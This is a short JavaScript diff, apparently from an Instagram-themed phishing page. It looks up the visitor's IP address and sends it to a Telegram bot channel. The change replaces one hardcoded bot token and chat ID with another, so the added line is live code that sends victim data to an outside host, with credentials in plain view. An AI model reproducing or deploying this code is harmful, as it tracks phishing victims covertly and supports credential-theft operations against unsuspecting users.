@@ -11,7 +11,7 @@ fetch('https://api.db-ip.com/v2/free/self')
     .then(result => result.json())
     .then((output) => {
         ip = output;
-        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=` + `INSTAGRAM--------${ip.ipAddress}`
+        const url = `https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage?chat_id=-1001801844217&text=` + `INSTAGRAM--------${ip.ipAddress}`
         fetch(url, {
             method: "POST",
             headers: { 'Content-Type': 'application/json' },
